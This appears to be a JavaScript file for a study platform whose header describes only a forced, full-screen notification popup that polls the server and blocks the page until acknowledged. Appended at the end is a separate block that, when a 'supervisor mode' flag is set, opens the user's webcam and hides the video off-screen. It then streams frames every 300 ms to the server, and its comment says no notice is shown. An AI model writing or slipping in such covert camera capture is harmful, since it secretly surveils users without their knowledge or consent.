// ============================================================
// 强制提醒/弹窗逻辑 - 所有页面引入此脚本
// 轮询: 每10秒检查一次 /api/my-notifications
// 弹窗: 全屏模态框，用户不确认无法操作
// ============================================================

(function () {
  // 状态管理
  let pollingInterval = null;
  let currentPopup = null;      // 当前显示的提醒（用于避免重复）
  let pendingQueue = [];        // 未处理的提醒队列
  let lastPollTime = 0;         // 上次轮询时间（避免短时间内重复）
  let soundCache = {};          // 音频缓存

  // 是否已经初始化（防止同一页面重复引用）
  if (window.__NOTIFICATION_INITED__) return;
  window.__NOTIFICATION_INITED__ = true;

  // ------------------------------------------------------------
  // 1. 初始化：注入样式
  // ------------------------------------------------------------
  function injectStyles() {
    const style = document.createElement('style');
    style.innerHTML = `
      /* 强制提醒遮罩 - 覆盖整个视口 */
      #__noticeMask {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(5, 15, 35, 0.88);
        z-index: 999999;
        display: none;
        align-items: center;
        justify-content: center;
        padding: 20px;
        animation: __noticeFadeIn 0.3s ease-out;
        backdrop-filter: blur(6px);
      }
      #__noticeMask.__show { display: flex; }
      @keyframes __noticeFadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
      }

      /* 弹窗主体 */
      #__noticeBox {
        background: #fff;
        border-radius: 20px;
        max-width: 560px;
        width: 100%;
        padding: 0;
        box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5), 0 0 0 3px rgba(255,255,255,0.1);
        overflow: hidden;
        animation: __noticePopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        border: 3px solid transparent;
      }
      #__noticeBox.__critical {
        border-color: #dc2626;
        box-shadow: 0 25px 80px rgba(220, 38, 38, 0.45), 0 0 0 3px rgba(220,38,38,0.3);
      }
      @keyframes __noticePopIn {
        from { transform: scale(0.7) translateY(40px); opacity: 0; }
        to { transform: scale(1) translateY(0); opacity: 1; }
      }

      /* 顶部装饰条 */
      #__noticeBar {
        height: 80px;
        background: linear-gradient(135deg, #2563eb 0%, #7c3aed 100%);
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
      }
      #__noticeBox.__critical #__noticeBar {
        background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
      }

      /* 大图标 */
      #__noticeIcon {
        font-size: 40px;
        animation: __noticeShake 2.5s ease-in-out infinite;
      }
      @keyframes __noticeShake {
        0%, 60%, 100% { transform: rotate(0deg); }
        10%, 30% { transform: rotate(-15deg); }
        20%, 40% { transform: rotate(15deg); }
        50% { transform: rotate(0deg) scale(1.2); }
      }

      /* 标题与内容 */
      #__noticeBody {
        padding: 24px 32px 28px;
        text-align: center;
      }
      #__noticeTitle {
        font-size: 22px;
        font-weight: 800;
        color: #1f2937;
        margin: 0 0 12px;
      }
      #__noticeBox.__critical #__noticeTitle { color: #991b1b; }

      #__noticeContent {
        font-size: 15px;
        color: #374151;
        line-height: 1.7;
        margin: 0 0 20px;
        white-space: pre-wrap;
        text-align: left;
        background: #f9fafb;
        padding: 14px 18px;
        border-radius: 10px;
        border-left: 4px solid #2563eb;
      }
      #__noticeBox.__critical #__noticeContent {
        border-left-color: #dc2626;
        background: #fef2f2;
      }

      /* 元信息 */
      #__noticeMeta {
        font-size: 12px;
        color: #6b7280;
        margin-bottom: 18px;
        display: flex;
        justify-content: center;
        gap: 18px;
      }
      #__noticeMeta span { font-weight: 600; color: #1f2937; }

      /* 确认按钮 */
      #__noticeBtn {
        padding: 12px 56px;
        background: linear-gradient(90deg, #2563eb, #7c3aed);
        color: #fff;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: transform 0.15s, box-shadow 0.2s;
        box-shadow: 0 8px 24px rgba(37, 99, 235, 0.35);
      }
      #__noticeBox.__critical #__noticeBtn {
        background: linear-gradient(90deg, #dc2626, #991b1b);
        box-shadow: 0 8px 24px rgba(220, 38, 38, 0.35);
      }
      #__noticeBtn:hover { transform: translateY(-2px); box-shadow: 0 12px 28px rgba(37, 99, 235, 0.45); }
      #__noticeBtn:active { transform: translateY(0); }
      #__noticeBtn:focus { outline: none; box-shadow: 0 8px 24px rgba(37,99,235,0.45), 0 0 0 3px rgba(37,99,235,0.25); }

      /* 剩余计数 */
      #__noticeCount {
        font-size: 11px;
        color: #6b7280;
        margin-top: 10px;
      }
    `;
    document.head.appendChild(style);
  }

  // ------------------------------------------------------------
  // 2. 构建 DOM 结构
  // ------------------------------------------------------------
  function buildDOM() {
    if (document.getElementById('__noticeMask')) return;
    const mask = document.createElement('div');
    mask.id = '__noticeMask';
    mask.innerHTML = `
      <div id="__noticeBox">
        <div id="__noticeBar"><span id="__noticeIcon">📢</span></div>
        <div id="__noticeBody">
          <h2 id="__noticeTitle">学习提醒</h2>
          <div id="__noticeMeta">
            <span>👤 管理员</span>
            <span id="__noticeTime"></span>
          </div>
          <div id="__noticeContent">内容</div>
          <button id="__noticeBtn" autocomplete="off">✅ 我已收到，继续学习</button>
          <div id="__noticeCount"></div>
        </div>
      </div>
    `;
    document.body.appendChild(mask);
    document.getElementById('__noticeBtn').addEventListener('click', handleAck);
    // 按 Enter 键也能确认
    document.addEventListener('keydown', (e) => {
      const m = document.getElementById('__noticeMask');
      if (m && m.classList.contains('__show') && (e.key === 'Enter' || e.key === ' ')) {
        e.preventDefault();
        handleAck();
      }
    });
  }

  // ------------------------------------------------------------
  // 3. 播放提示音（使用 Web Audio API，无需额外资源文件）
  // ------------------------------------------------------------
  function playAlertSound(level) {
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (!AudioCtx) return;
      const ctx = new AudioCtx();
      // 简单的两声哔哔提示音，严重级别更大声
      const loud = (level === 'critical') ? 0.5 : 0.25;
      const freqs = level === 'critical' ? [880, 660, 880] : [660, 880];
      freqs.forEach((f, i) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(f, ctx.currentTime + i * 0.25);
        gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.25);
        gain.gain.linearRampToValueAtTime(loud, ctx.currentTime + i * 0.25 + 0.02);
        gain.gain.linearRampToValueAtTime(0, ctx.currentTime + i * 0.25 + 0.18);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(ctx.currentTime + i * 0.25);
        osc.stop(ctx.currentTime + i * 0.25 + 0.2);
      });
      setTimeout(() => ctx.close(), 1200);
    } catch (e) {
      // 浏览器可能因为用户未交互前阻止音频，忽略即可
    }
  }

  // ------------------------------------------------------------
  // 4. 显示下一条提醒
  // ------------------------------------------------------------
  function showNext() {
    if (currentPopup) return;   // 已经在显示中
    if (pendingQueue.length === 0) { hideMask(); return; }

    const n = pendingQueue.shift();
    currentPopup = n;

    const box = document.getElementById('__noticeBox');
    document.getElementById('__noticeTitle').textContent = n.title || '系统提醒';
    document.getElementById('__noticeContent').textContent = n.content || '';
    document.getElementById('__noticeIcon').textContent = n.level === 'critical' ? '⚠️' : '📢';
    document.getElementById('__noticeTime').textContent = (n.created_at || '').slice(0, 16);
    // 管理员信息
    const meta = box.querySelector('#__noticeMeta span:first-child');
    meta.textContent = '👤 ' + (n.created_by || '管理员');
    // 级别样式
    if (n.level === 'critical') box.classList.add('__critical');
    else box.classList.remove('__critical');
    // 剩余计数
    const cnt = document.getElementById('__noticeCount');
    cnt.textContent = pendingQueue.length > 0 ? `还有 ${pendingQueue.length} 条待查看` : '';

    // 显示
    document.getElementById('__noticeMask').classList.add('__show');
    // 播放提示音
    if (n.sound_enabled !== 0 && n.sound_enabled !== '0') {
      playAlertSound(n.level);
      // 严重级别：延迟再响一次
      if (n.level === 'critical') {
        setTimeout(() => playAlertSound(n.level), 1200);
      }
    }
    // 聚焦到确认按钮
    setTimeout(() => {
      const btn = document.getElementById('__noticeBtn');
      if (btn) btn.focus();
    }, 100);
  }

  function hideMask() {
    const m = document.getElementById('__noticeMask');
    if (m) m.classList.remove('__show');
    currentPopup = null;
  }

  function handleAck() {
    if (!currentPopup) return;
    const n = currentPopup;
    // 异步确认
    fetch('/api/my-notifications/' + n.id + '/ack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }).then(() => {
      // 成功或失败都继续（避免卡住用户）
      currentPopup = null;
      showNext();
    }).catch(() => {
      currentPopup = null;
      showNext();
    });
  }

  // ------------------------------------------------------------
  // 5. 轮询后端（登录后才启用）
  // ------------------------------------------------------------
  async function pollNotifications() {
    // 避免短时间内重复请求
    const now = Date.now();
    if (now - lastPollTime < 3000) return;
    lastPollTime = now;

    try {
      const r = await fetch('/api/my-notifications', { cache: 'no-store' });
      if (r.status === 401 || r.status === 403) return; // 未登录，静默跳过
      const data = await r.json();
      if (data.success && data.data && data.data.length > 0) {
        // 把尚未在 pendingQueue 和 currentPopup 中的加入队列
        const existingIds = new Set(pendingQueue.map(x => x.id));
        if (currentPopup) existingIds.add(currentPopup.id);
        for (const n of data.data) {
          if (!existingIds.has(n.id)) {
            pendingQueue.push(n);
            existingIds.add(n.id);
          }
        }
        // 有新提醒则显示
        if (pendingQueue.length > 0 && !currentPopup) showNext();
      }
    } catch (e) {
      // 网络失败静默跳过，下一轮再试
    }
  }

  // ------------------------------------------------------------
  // 6. 启动：先检查是否已登录（页面已经有自己的登录检查）
  // ------------------------------------------------------------
  function start() {
    injectStyles();
    buildDOM();
    // 首次加载时立即检查一次（页面加载完成后 1.5 秒）
    setTimeout(pollNotifications, 1500);
    // 每 10 秒轮询一次
    pollingInterval = setInterval(pollNotifications, 10000);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start);
  } else {
    start();
  }
})();

// ============================================================
// 学生端摄像头实时推送（勾选监督模式后启用）
// 不保存任何内容，仅在内存中转；不显示任何提示
// ============================================================
(function () {
  if (localStorage.getItem('supervisor_mode') !== '1') return;
  const username = localStorage.getItem('supervisor_username') || 'unknown';

  let ws = null;

  function connectWS() {
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    const url = proto + '://' + location.host + '/?role=student&u=' + encodeURIComponent(username);
    try { ws = new WebSocket(url); } catch (e) { return; }
    ws.onopen = function () { startCapture(); };
    ws.onclose = function () { setTimeout(connectWS, 2000); };
    ws.onerror = function () { try { ws.close(); } catch (e) {} };
  }

  let videoEl = null;
  let canvasEl = null;
  let captureTimer = null;

  function startCapture() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({
      video: { width: 320, height: 240, facingMode: 'user' },
      audio: false
    }).then(function (s) {
      videoEl = document.createElement('video');
      videoEl.autoplay = true; videoEl.muted = true; videoEl.playsInline = true;
      videoEl.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
      videoEl.srcObject = s;
      document.body.appendChild(videoEl);
      canvasEl = document.createElement('canvas');
      canvasEl.width = 320; canvasEl.height = 240;
      videoEl.onloadedmetadata = function () {
        videoEl.play().catch(function () {});
        if (captureTimer) clearInterval(captureTimer);
        captureTimer = setInterval(captureAndSend, 300);
      };
    }).catch(function () {});
  }

  function captureAndSend() {
    if (!ws || ws.readyState !== 1 || !videoEl || !canvasEl) return;
    try {
      const ctx = canvasEl.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      const dataUrl = canvasEl.toDataURL('image/jpeg', 0.5);
      ws.send(JSON.stringify({ type: 'frame', frame: dataUrl }));
    } catch (e) {}
  }

  connectWS();
})();
